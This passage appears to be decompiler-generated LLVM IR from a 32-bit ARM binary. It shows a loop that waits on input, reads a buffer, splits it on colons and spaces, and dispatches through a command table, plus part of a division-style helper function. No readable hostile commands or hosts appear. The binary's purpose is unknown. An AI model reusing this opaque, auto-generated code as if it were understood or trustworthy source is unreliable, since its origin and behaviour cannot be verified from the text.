  store i32 ptrtoint ([6 x i8]* @global_var_16b14.249 to i32), i32* @r1, align 4
  %v4_c2f0 = call i32 @function_f1d0(i32 %v0_c2e4, i32 ptrtoint ([6 x i8]* @global_var_16b14.249 to i32), i32 %v0_c2dc)
  br label %dec_label_pc_c370

dec_label_pc_c300:                                ; preds = %dec_label_pc_c370
  %v3_c304 = mul i32 %storemerge11, 4
  %v2_c31c = add i32 %v3_c304, %tmp
  %v1_c320 = inttoptr i32 %v2_c31c to i32*
  %v2_c320 = load i32, i32* %v1_c320, align 4
  store i32 %v2_c320, i32* @r4, align 4
  %v2_c344 = load i32, i32* %v1_c320, align 4
  store i32 %v2_c344, i32* @r0, align 4
  %v0_c34c = call i32 @function_f030()
  %v0_c354 = load i32, i32* @r4, align 4
  store i32 %v0_c34c, i32* @r2, align 4
  %v2_c360 = inttoptr i32 %v0_c354 to i8*
  %v3_c360 = call i32 @function_ef70(i8* %v2_c360, i32 0)
  %v1_c368 = add nuw i32 %storemerge11, 1
  br label %dec_label_pc_c370

dec_label_pc_c370:                                ; preds = %dec_label_pc_c2b0, %dec_label_pc_c300
  %storemerge11 = phi i32 [ 1, %dec_label_pc_c2b0 ], [ %v1_c368, %dec_label_pc_c300 ]
  %v5_c388 = icmp slt i32 %storemerge11, %arg1
  br i1 %v5_c388, label %dec_label_pc_c300, label %dec_label_pc_c38c

dec_label_pc_c38c:                                ; preds = %dec_label_pc_c370
  %v2_c390 = call i32 @function_ce30(i32* null)
  store i32 %v2_c390, i32* @r4, align 4
  %v0_c398 = call i32 @function_cd2c()
  %v0_c3a0 = load i32, i32* @r4, align 4
  %v2_c3a0 = xor i32 %v0_c3a0, %v0_c398
  store i32 %v2_c3a0, i32* @r4, align 4
  %v0_c3a4 = call i32 @function_cd58()
  %v0_c3ac = load i32, i32* @r4, align 4
  %v2_c3ac = add i32 %v0_c3ac, %v0_c3a4
  %v1_c3b4 = call i32 @function_10508(i32 %v2_c3ac)
  %v0_c3b8 = call i32 @function_8688()
  store i32 %v0_c3b8, i32* @global_var_22dbc.187, align 4
  %v0_c3c8 = call i32 @function_8688()
  store i32 %v0_c3c8, i32* @global_var_22db8.41, align 4
  %v0_c3d8 = call i32 @function_8688()
  store i32 %v0_c3d8, i32* @global_var_22dc4.253, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16b1c.256 to i32), i32* @global_var_22ed0.185, align 4
  store i32 ptrtoint (i32* @global_var_16b20.259 to i32), i32* @global_var_22ecc.211, align 4
  store i32 0, i32* @global_var_22ec8.142, align 4
  %v2_c450 = ptrtoint i32* %stack_var_-596 to i32
  %v2_c510 = ptrtoint i32* %stack_var_-340 to i32
  %v2_c72c = ptrtoint i32* %stack_var_-6740 to i32
  %v2_c768 = add i32 %v16_c098, -6720
  %v2_c81c = ptrtoint i32* %stack_var_-2644 to i32
  %v2_c8c8 = ptrtoint i32* %stack_var_-1620 to i32
  %v3_c994 = bitcast i32* %stack_var_-1620 to i8*
  br label %dec_label_pc_c410

dec_label_pc_c410:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c48c, %dec_label_pc_c988, %dec_label_pc_c38c
  %v0_c410 = call i32 @function_bd88()
  %v2_c418 = load i32, i32* @global_var_22dc0.25, align 4
  %v2_c420 = load i32, i32* @global_var_22dbc.187, align 4
  %v2_c428 = load i32, i32* @global_var_22db8.41, align 4
  store i32 %v2_c428, i32* @lr, align 4
  store i32 %v2_c420, i32* @r2, align 4
  %v3_c448 = call i32 @function_8374(i32 %v2_c418, i32 ptrtoint ([41 x i8]* @global_var_16b24.263 to i32))
  br label %dec_label_pc_c464.lr.ph

dec_label_pc_c464.lr.ph:                          ; preds = %dec_label_pc_c6d8, %dec_label_pc_c758, %dec_label_pc_c9a4, %dec_label_pc_c9c4, %dec_label_pc_c410
  br label %dec_label_pc_c464

dec_label_pc_c464:                                ; preds = %dec_label_pc_c464.lr.ph, %dec_label_pc_c464
  %storemerge1226 = phi i32 [ 0, %dec_label_pc_c464.lr.ph ], [ %v1_c478, %dec_label_pc_c464 ]
  %v5_c470 = mul nuw nsw i32 %storemerge1226, 4
  %v6_c470 = add i32 %v5_c470, %v2_c450
  %v7_c470 = inttoptr i32 %v6_c470 to i32*
  store i32 0, i32* %v7_c470, align 4
  %v1_c478 = add nuw nsw i32 %storemerge1226, 1
  %tmp66 = icmp ult i32 %v1_c478, 32
  br i1 %tmp66, label %dec_label_pc_c464, label %dec_label_pc_c48c

dec_label_pc_c48c:                                ; preds = %dec_label_pc_c464
  %v2_c490 = load i32, i32* @global_var_22dc0.25, align 4
  %v3_c494 = udiv i32 %v2_c490, 32
  %v3_c4a8 = mul nuw nsw i32 %v3_c494, 4
  %v2_c4b0 = add i32 %v3_c4a8, %v16_c098
  %v2_c4b4 = add i32 %v2_c4b0, -576
  %v1_c4b8 = inttoptr i32 %v2_c4b4 to i32*
  %v2_c4b8 = load i32, i32* %v1_c4b8, align 4
  %v1_c4c4 = urem i32 %v2_c490, 32
  %v6_c4cc = shl i32 1, %v1_c4c4
  %v2_c4d0 = or i32 %v2_c4b8, %v6_c4cc
  store i32 %v2_c4d0, i32* %v1_c4b8, align 4
  store i32 1200, i32* %stack_var_-340, align 4
  %v2_c504 = load i32, i32* @global_var_22dc0.25, align 4
  %v1_c508 = add i32 %v2_c504, 1
  %v5_c524 = call i32 @function_ce00(i32 %v1_c508, i32 %v2_c450, i32 0, i32 0, i32 %v2_c510)
  %tmp67 = icmp slt i32 %v5_c524, 1
  br i1 %tmp67, label %dec_label_pc_c410, label %dec_label_pc_c6c4.preheader

dec_label_pc_c6c4.preheader:                      ; preds = %dec_label_pc_c48c
  %v2_c6c897 = load i32, i32* @global_var_20648.29, align 4
  %v3_c6d099 = icmp eq i32 %v2_c6c897, 0
  br i1 %v3_c6d099, label %dec_label_pc_c6d8, label %dec_label_pc_c540

dec_label_pc_c540:                                ; preds = %dec_label_pc_c6b8, %dec_label_pc_c6c4.preheader
  %storemerge13106 = phi i32 [ %.pre124, %dec_label_pc_c6b8 ], [ 0, %dec_label_pc_c6c4.preheader ]
  %v3_c544 = mul i32 %storemerge13106, 4
  %v2_c550 = load i32, i32* @global_var_22ed4.31, align 4
  %v2_c554 = add i32 %v2_c550, %v3_c544
  %v1_c558 = inttoptr i32 %v2_c554 to i32*
  %v2_c558 = load i32, i32* %v1_c558, align 4
  store i32 %v2_c558, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v3_c568 = call i32 @function_ce5c(i32 %v2_c558, i32 0, i32 1)
  %tmp68 = icmp slt i32 %v3_c568, 1
  %.pre124 = add i32 %storemerge13106, 1
  br i1 %tmp68, label %dec_label_pc_c6b8, label %dec_label_pc_c5d0.preheader

dec_label_pc_c5d0.preheader:                      ; preds = %dec_label_pc_c540
  %v2_c5d476 = load i32, i32* @global_var_20648.29, align 4
  %v3_c5dc78 = icmp ult i32 %.pre124, %v2_c5d476
  %v3_c5e879 = mul i32 %.pre124, 4
  %v2_c5f480 = load i32, i32* @global_var_22ed4.31, align 4
  %v2_c5f881 = add i32 %v2_c5f480, %v3_c5e879
  %v1_c5fc82 = add i32 %v2_c5f881, -4
  br i1 %v3_c5dc78, label %dec_label_pc_c588, label %dec_label_pc_c5e4

dec_label_pc_c588:                                ; preds = %dec_label_pc_c5d0.preheader, %dec_label_pc_c588
  %v1_c5fc86 = phi i32 [ %v1_c5fc, %dec_label_pc_c588 ], [ %v1_c5fc82, %dec_label_pc_c5d0.preheader ]
  %v2_c5f885 = phi i32 [ %v2_c5f8, %dec_label_pc_c588 ], [ %v2_c5f881, %dec_label_pc_c5d0.preheader ]
  %v1_c57c83 = phi i32 [ %v1_c57c, %dec_label_pc_c588 ], [ %.pre124, %dec_label_pc_c5d0.preheader ]
  %v1_c5bc = inttoptr i32 %v2_c5f885 to i32*
  %v2_c5bc = load i32, i32* %v1_c5bc, align 4
  %v2_c5c0 = inttoptr i32 %v1_c5fc86 to i32*
  store i32 %v2_c5bc, i32* %v2_c5c0, align 4
  %v1_c57c = add i32 %v1_c57c83, 1
  %v2_c5d4 = load i32, i32* @global_var_20648.29, align 4
  %v3_c5dc = icmp ult i32 %v1_c57c, %v2_c5d4
  %v3_c5e8 = mul i32 %v1_c57c, 4
  %v2_c5f4 = load i32, i32* @global_var_22ed4.31, align 4
  %v2_c5f8 = add i32 %v2_c5f4, %v3_c5e8
  %v1_c5fc = add i32 %v2_c5f8, -4
  br i1 %v3_c5dc, label %dec_label_pc_c588, label %dec_label_pc_c5d0.dec_label_pc_c5e4_crit_edge

dec_label_pc_c5d0.dec_label_pc_c5e4_crit_edge:    ; preds = %dec_label_pc_c588
  br label %dec_label_pc_c5e4

dec_label_pc_c5e4:                                ; preds = %dec_label_pc_c5d0.dec_label_pc_c5e4_crit_edge, %dec_label_pc_c5d0.preheader
  %v1_c5fc.lcssa = phi i32 [ %v1_c5fc, %dec_label_pc_c5d0.dec_label_pc_c5e4_crit_edge ], [ %v1_c5fc82, %dec_label_pc_c5d0.preheader ]
  %v2_c604 = inttoptr i32 %v1_c5fc.lcssa to i32*
  store i32 0, i32* %v2_c604, align 4
  %v2_c60c = load i32, i32* @global_var_20648.29, align 4
  %v1_c610 = add i32 %v2_c60c, -1
  store i32 %v1_c610, i32* @global_var_20648.29, align 4
  %v3_c624 = mul i32 %v1_c610, 4
  %v1_c628 = add i32 %v3_c624, 4
  %v1_c630 = call i32 @function_fc78(i32 %v1_c628)
  %v2_c68c90 = load i32, i32* @global_var_20648.29, align 4
  %v3_c69492 = icmp eq i32 %v2_c68c90, 0
  br i1 %v3_c69492, label %dec_label_pc_c69c, label %dec_label_pc_c648

dec_label_pc_c648:                                ; preds = %dec_label_pc_c5e4, %dec_label_pc_c648
  %storemerge1593 = phi i32 [ %v1_c680, %dec_label_pc_c648 ], [ 0, %dec_label_pc_c5e4 ]
  %v3_c64c = mul i32 %storemerge1593, 4
  %v2_c658 = add i32 %v3_c64c, %v1_c630
  %v2_c66c = load i32, i32* @global_var_22ed4.31, align 4
  %v2_c670 = add i32 %v2_c66c, %v3_c64c
  %v1_c674 = inttoptr i32 %v2_c670 to i32*
  %v2_c674 = load i32, i32* %v1_c674, align 4
  %v2_c678 = inttoptr i32 %v2_c658 to i32*
  store i32 %v2_c674, i32* %v2_c678, align 4
  %v1_c680 = add i32 %storemerge1593, 1
  %v2_c68c = load i32, i32* @global_var_20648.29, align 4
  %v3_c694 = icmp ult i32 %v1_c680, %v2_c68c
  br i1 %v3_c694, label %dec_label_pc_c648, label %dec_label_pc_c688.dec_label_pc_c69c_crit_edge

dec_label_pc_c688.dec_label_pc_c69c_crit_edge:    ; preds = %dec_label_pc_c648
  br label %dec_label_pc_c69c

dec_label_pc_c69c:                                ; preds = %dec_label_pc_c5e4, %dec_label_pc_c688.dec_label_pc_c69c_crit_edge
  %v2_c6a0 = load i32, i32* @global_var_22ed4.31, align 4
  store i32 %v2_c6a0, i32* @r0, align 4
  %v0_c6a8 = call i32 @function_fdcc()
  store i32 %v1_c630, i32* @global_var_22ed4.31, align 4
  br label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c540, %dec_label_pc_c69c
  %v2_c6c8 = load i32, i32* @global_var_20648.29, align 4
  %v3_c6d0 = icmp ult i32 %.pre124, %v2_c6c8
  br i1 %v3_c6d0, label %dec_label_pc_c540, label %dec_label_pc_c6d8

dec_label_pc_c6d8:                                ; preds = %dec_label_pc_c6b8, %dec_label_pc_c6c4.preheader
  %v2_c6dc = load i32, i32* @global_var_22dc0.25, align 4
  %v3_c6e0 = udiv i32 %v2_c6dc, 32
  %v3_c6ec = mul nuw nsw i32 %v3_c6e0, 4
  %v2_c6f4 = add i32 %v3_c6ec, %v16_c098
  %v2_c6f8 = add i32 %v2_c6f4, -576
  %v1_c6fc = inttoptr i32 %v2_c6f8 to i32*
  %v2_c6fc = load i32, i32* %v1_c6fc, align 4
  %v1_c708 = urem i32 %v2_c6dc, 32
  %v6_c70c2 = lshr i32 %v2_c6fc, %v1_c708
  %v1_c714 = urem i32 %v6_c70c2, 2
  %v2_c718 = icmp eq i32 %v1_c714, 0
  br i1 %v2_c718, label %dec_label_pc_c464.lr.ph, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c6d8
  %v5_c740 = call i32 @function_fbbc(i32 %v2_c6dc, i32* nonnull %stack_var_-6740, i32 4096, i32 0)
  %tmp69 = icmp slt i32 %v5_c740, 1
  br i1 %tmp69, label %dec_label_pc_c410, label %dec_label_pc_c758

dec_label_pc_c758:                                ; preds = %dec_label_pc_c720
  %v2_c76c = add i32 %v2_c768, %v5_c740
  %v3_c76c = inttoptr i32 %v2_c76c to i8*
  store i8 0, i8* %v3_c76c, align 1
  store i32 %v2_c72c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16b50.267 to i32), i32* @r1, align 4
  %v6_c788 = call i32 @function_f510(i32 %v2_c72c, i32 ptrtoint (i32* @global_var_16b50.267 to i32), i32 %v2_c76c, i32 %v2_c72c, i32 %v5_c740)
  %v2_c9bc29 = icmp eq i32 %v6_c788, 0
  br i1 %v2_c9bc29, label %dec_label_pc_c464.lr.ph, label %dec_label_pc_c9c4

dec_label_pc_c798:                                ; preds = %dec_label_pc_c9c4
  %v2_c79c = call i32 @function_85f8(i32 %storemerge31.in)
  %v2_c7a4 = load i8, i8* %storemerge31, align 1
  %v7_c7a8 = icmp eq i8 %v2_c7a4, 58
  br i1 %v7_c7a8, label %dec_label_pc_c7c8, label %dec_label_pc_c850

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c7e0
  %v1_c7c0 = add i32 %storemerge20, 1
  br label %dec_label_pc_c7c8

dec_label_pc_c7c8:                                ; preds = %dec_label_pc_c798, %dec_label_pc_c7bc
  %storemerge20 = phi i32 [ %v1_c7c0, %dec_label_pc_c7bc ], [ 0, %dec_label_pc_c798 ]
  store i32 %storemerge31.in, i32* @r0, align 4
  %v0_c7d0 = call i32 @function_f030()
  %v3_c7d8 = icmp ult i32 %storemerge20, %v0_c7d0
  br i1 %v3_c7d8, label %dec_label_pc_c7e0, label %dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge

dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge:    ; preds = %dec_label_pc_c7c8
  %.pre = add i32 %storemerge20, %storemerge31.in
  %.pre32 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_c7fc

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7c8
  %v2_c7ec = add i32 %storemerge20, %storemerge31.in
  %v1_c7f0 = inttoptr i32 %v2_c7ec to i8*
  %v2_c7f0 = load i8, i8* %v1_c7f0, align 1
  %v7_c7f4 = icmp eq i8 %v2_c7f0, 32
  br i1 %v7_c7f4, label %dec_label_pc_c7fc, label %dec_label_pc_c7bc

dec_label_pc_c7fc:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge
  %v3_c810.pre-phi = phi i8* [ %.pre32, %dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge ], [ %v1_c7f0, %dec_label_pc_c7e0 ]
  %v2_c808.pre-phi = phi i32 [ %.pre, %dec_label_pc_c7c8.dec_label_pc_c7fc_crit_edge ], [ %v2_c7ec, %dec_label_pc_c7e0 ]
  store i8 0, i8* %v3_c810.pre-phi, align 1
  %v1_c818 = add i32 %storemerge31.in, 1
  %v2_c828 = inttoptr i32 %v1_c818 to i8*
  %v3_c828 = call i32 @function_f090(i32 %v2_c81c, i8* %v2_c828)
  %v1_c83c = add i32 %v2_c808.pre-phi, 1
  %v3_c848 = inttoptr i32 %v1_c83c to i8*
  %v4_c848 = call i32 @function_f090(i32 %storemerge31.in, i8* %v3_c848)
  br label %dec_label_pc_c87c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c798
  store i32 42, i32* %stack_var_-2644, align 4
  br label %dec_label_pc_c87c

dec_label_pc_c870:                                ; preds = %dec_label_pc_c894
  %v1_c874 = add i32 %storemerge17, 1
  br label %dec_label_pc_c87c

dec_label_pc_c87c:                                ; preds = %dec_label_pc_c850, %dec_label_pc_c7fc, %dec_label_pc_c870
  %storemerge17 = phi i32 [ %v1_c874, %dec_label_pc_c870 ], [ 0, %dec_label_pc_c7fc ], [ 0, %dec_label_pc_c850 ]
  store i32 %storemerge17, i32* @r4, align 4
  store i32 %storemerge31.in, i32* @r0, align 4
  %v0_c884 = call i32 @function_f030()
  %v0_c88c = load i32, i32* @r4, align 4
  %v3_c88c = icmp ult i32 %v0_c88c, %v0_c884
  br i1 %v3_c88c, label %dec_label_pc_c894, label %dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge

dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge:    ; preds = %dec_label_pc_c87c
  %.pre33 = add i32 %storemerge17, %storemerge31.in
  %.pre34 = inttoptr i32 %.pre33 to i8*
  br label %dec_label_pc_c8b0

dec_label_pc_c894:                                ; preds = %dec_label_pc_c87c
  %v2_c8a0 = add i32 %storemerge17, %storemerge31.in
  %v1_c8a4 = inttoptr i32 %v2_c8a0 to i8*
  %v2_c8a4 = load i8, i8* %v1_c8a4, align 1
  %v7_c8a8 = icmp eq i8 %v2_c8a4, 32
  br i1 %v7_c8a8, label %dec_label_pc_c8b0, label %dec_label_pc_c870

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c894, %dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge
  %v3_c8c4.pre-phi = phi i8* [ %.pre34, %dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge ], [ %v1_c8a4, %dec_label_pc_c894 ]
  %v2_c8bc.pre-phi = phi i32 [ %.pre33, %dec_label_pc_c87c.dec_label_pc_c8b0_crit_edge ], [ %v2_c8a0, %dec_label_pc_c894 ]
  store i8 0, i8* %v3_c8c4.pre-phi, align 1
  %v4_c8d4 = call i32 @function_f090(i32 %v2_c8c8, i8* %storemerge31)
  %v1_c8e8 = add i32 %v2_c8bc.pre-phi, 1
  %v3_c8f4 = inttoptr i32 %v1_c8e8 to i8*
  %v4_c8f4 = call i32 @function_f090(i32 %storemerge31.in, i8* %v3_c8f4)
  %v8_c97c107 = load i32, i32* bitcast ([4 x i8]** @global_var_20278.270 to i32*), align 4
  %v2_c980109 = icmp eq i32 %v8_c97c107, 0
  br i1 %v2_c980109, label %dec_label_pc_c988, label %dec_label_pc_c904

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8b0, %dec_label_pc_c904
  %v7_c97c112 = phi i32* [ %v7_c97c, %dec_label_pc_c904 ], [ bitcast ([4 x i8]** @global_var_20278.270 to i32*), %dec_label_pc_c8b0 ]
  %storemerge18110 = phi i32 [ %v1_c96c, %dec_label_pc_c904 ], [ 0, %dec_label_pc_c8b0 ]
  %v7_c90c = load i32, i32* %v7_c97c112, align 4
  %v2_c91c = inttoptr i32 %v7_c90c to i8*
  %v3_c91c = call i32 @function_f464(i8* %v2_c91c, i32 %v2_c8c8)
  %v3_c938 = mul i32 %storemerge18110, 8
  %v2_c940 = add i32 %v3_c938, add (i32 ptrtoint ([4 x i8]** @global_var_20278.270 to i32), i32 4)
  %v1_c944 = inttoptr i32 %v2_c940 to i32*
  %v2_c944 = load i32, i32* %v1_c944, align 4
  store i32 %v2_c944, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_c944)
  %v1_c96c = add i32 %storemerge18110, 1
  %v5_c97c = mul i32 %v1_c96c, 8
  %v6_c97c = add i32 %v5_c97c, ptrtoint ([4 x i8]** @global_var_20278.270 to i32)
  %v7_c97c = inttoptr i32 %v6_c97c to i32*
  %v8_c97c = load i32, i32* %v7_c97c, align 4
  %v2_c980 = icmp eq i32 %v8_c97c, 0
  br i1 %v2_c980, label %dec_label_pc_c988, label %dec_label_pc_c904

dec_label_pc_c988:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c8b0
  %v4_c994 = call i32 @function_f464(i8* %v3_c994, i32 ptrtoint ([6 x i8]* @global_var_16b54.272 to i32))
  %v2_c99c = icmp eq i32 %v4_c994, 0
  br i1 %v2_c99c, label %dec_label_pc_c410, label %dec_label_pc_c9a4

dec_label_pc_c9a4:                                ; preds = %dec_label_pc_c988
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16b50.267 to i32), i32* @r1, align 4
  %v6_c9ac = call i32 @function_f510(i32 0, i32 ptrtoint (i32* @global_var_16b50.267 to i32), i32 ptrtoint ([4 x i8]** @global_var_20278.270 to i32), i32 %v4_c994, i32 ptrtoint (i32* @0 to i32))
  %v2_c9bc = icmp eq i32 %v6_c9ac, 0
  br i1 %v2_c9bc, label %dec_label_pc_c464.lr.ph, label %dec_label_pc_c9c4

dec_label_pc_c9c4:                                ; preds = %dec_label_pc_c758, %dec_label_pc_c9a4
  %storemerge31.in = phi i32 [ %v6_c9ac, %dec_label_pc_c9a4 ], [ %v6_c788, %dec_label_pc_c758 ]
  %storemerge31 = inttoptr i32 %storemerge31.in to i8*
  %v2_c9c8 = load i8, i8* %storemerge31, align 1
  %v2_c9cc = icmp eq i8 %v2_c9c8, 0
  br i1 %v2_c9cc, label %dec_label_pc_c464.lr.ph, label %dec_label_pc_c798

; uselistorder directives
  uselistorder i8* %storemerge31, { 2, 1, 0 }
  uselistorder i32 %storemerge31.in, { 10, 9, 6, 3, 2, 5, 4, 8, 1, 0, 7 }
  uselistorder i32* %v7_c97c, { 1, 0 }
  uselistorder i32 %v1_c96c, { 1, 0 }
  uselistorder i32 %storemerge18110, { 1, 0 }
  uselistorder i32 %.pre33, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge20, { 2, 1, 0, 3 }
  uselistorder i32 %v5_c740, { 1, 0, 2 }
  uselistorder i32 %v2_c6dc, { 2, 1, 0 }
  uselistorder i32 %v1_c680, { 1, 0 }
  uselistorder i32 %v3_c64c, { 1, 0 }
  uselistorder i32 %storemerge1593, { 1, 0 }
  uselistorder i32 %v1_c630, { 1, 0 }
  uselistorder i32 %v1_c5fc, { 1, 0 }
  uselistorder i32 %v2_c5f8, { 1, 0 }
  uselistorder i32 %v1_c57c, { 0, 2, 1 }
  uselistorder i32 %v1_c5fc82, { 1, 0 }
  uselistorder i32 %.pre124, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge13106, { 1, 0 }
  uselistorder i32 %v2_c490, { 1, 0 }
  uselistorder i32 %storemerge1226, { 1, 0 }
  uselistorder i32 %v2_c72c, { 0, 2, 1 }
  uselistorder i32 %v2_c450, { 1, 0 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i32 %v3_c250, { 1, 0, 2 }
  uselistorder i32 %v2_c1c4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-64.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1620, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_20278.270 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_20278.270, { 1, 0 }
  uselistorder i32 (i32)* @function_85f8, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_f510, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16b50.267 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_22ed4.31, { 1, 3, 4, 5, 0, 6, 2, 7, 8 }
  uselistorder i32* @global_var_20648.29, { 6, 7, 1, 4, 8, 9, 2, 0, 10, 3, 5, 11 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_ce00, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8374, { 9, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 4, 3, 2, 1, 8, 7, 6, 0, 5 }
  uselistorder i32* @global_var_22dc0.25, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14 }
  uselistorder i32* @global_var_22ec8.142, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_22db8.41, { 1, 0 }
  uselistorder i32* @global_var_22dbc.187, { 3, 0, 1, 4, 5, 2, 6, 7, 8, 9 }
  uselistorder i32 ()* @function_8688, { 2, 1, 0, 3 }
  uselistorder i32 ()* @function_cc10, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_15ca8.39 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder label %dec_label_pc_c9c4, { 1, 0 }
  uselistorder label %dec_label_pc_c904, { 1, 0 }
  uselistorder label %dec_label_pc_c87c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c7c8, { 1, 0 }
  uselistorder label %dec_label_pc_c6b8, { 1, 0 }
  uselistorder label %dec_label_pc_c69c, { 1, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c588, { 1, 0 }
  uselistorder label %dec_label_pc_c464, { 1, 0 }
  uselistorder label %dec_label_pc_c464.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_c410, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_c370, { 1, 0 }
  uselistorder label %dec_label_pc_c2b0, { 1, 0 }
  uselistorder label %dec_label_pc_c298, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_c180, { 1, 0 }
  uselistorder label %dec_label_pc_c10c, { 1, 0 }
}

define i32 @function_ca30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ca30:
  store i32 %arg1, i32* @r0, align 4
  %v1_ca30 = add i32 %arg2, -1
  %v2_ca30 = icmp eq i32 %arg2, 0
  br i1 %v2_ca30, label %dec_label_pc_caec, label %dec_label_pc_ca38

dec_label_pc_ca38:                                ; preds = %dec_label_pc_ca30
  %v7_ca30 = icmp eq i32 %arg2, 1
  br i1 %v7_ca30, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_ca38
  %v1_ca38 = load i32, i32* @r0, align 4
  %v10_ca38 = icmp eq i32 %v1_ca38, %arg2
  br i1 %v10_ca38, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_ca38, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_ca38 = icmp ult i32 %v1_ca38, %arg2
  br i1 %v4_ca38, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_ca40 = and i32 %v1_ca30, %arg2
  %v8_ca40 = icmp eq i32 %v6_ca40, 0
  br i1 %v8_ca40, label %.thread67, label %dec_label_pc_ca50.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_ca44 = phi i32 [ %v1_ca38, %bb75 ], [ 0, %.thread65 ]
  %v3_ca44 = and i32 %v1_ca44, %v1_ca30
  br label %bb76

dec_label_pc_ca50.preheader:                      ; preds = %bb75
  %v2_ca5099 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_ca5099, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_cae0, %bb74, %bb89, %bb84, %dec_label_pc_cab0, %.thread67
  %v5_ca48 = phi i32 [ %v1_ca38, %bb74 ], [ %v3_ca44, %.thread67 ], [ %v1_ca8c.v6_ca8c.v6_ca94.v6_ca9c, %dec_label_pc_cab0 ], [ 0, %bb84 ], [ %v1_cae4, %dec_label_pc_cae0 ], [ %v2_cae0, %bb89 ]
  ret i32 %v5_ca48

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_ca50.preheader
  %v0_ca64.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_ca50.preheader ], [ %v4_ca58, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_ca50.preheader ], [ %v2_ca5c11, %.thread1.thread9 ]
  br label %dec_label_pc_ca64thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_ca50.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_ca5c11, %.thread1.thread9 ], [ 0, %dec_label_pc_ca50.preheader ]
  %v0_ca64.pr33100 = phi i32 [ %v4_ca58, %.thread1.thread9 ], [ %arg2, %dec_label_pc_ca50.preheader ]
  %v4_ca54 = icmp ult i32 %v0_ca64.pr33100, %v1_ca38
  br i1 %v4_ca54, label %bb78, label %dec_label_pc_ca64thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_ca58 = and i32 %v0_ca64.pr33100, 268435456
  %v3_ca58 = icmp eq i32 %v2_ca58, 0
  %v4_ca58 = mul i32 %v0_ca64.pr33100, 16
  br i1 %v3_ca58, label %.thread1.thread9, label %dec_label_pc_ca64.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_ca5c11 = add i32 %storemerge101, 4
  %v2_ca50 = icmp ugt i32 %v4_ca58, 268435455
  br i1 %v2_ca50, label %.thread, label %bb77

dec_label_pc_ca64thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_ca64thread-pre-split.loopexit

dec_label_pc_ca64thread-pre-split.loopexit:       ; preds = %dec_label_pc_ca64thread-pre-split.loopexit.loopexit, %.thread
  %v0_ca64.pr3398 = phi i32 [ %v0_ca64.pr33.lcssa, %.thread ], [ %v0_ca64.pr33100, %dec_label_pc_ca64thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_ca64thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_ca64thread-pre-split

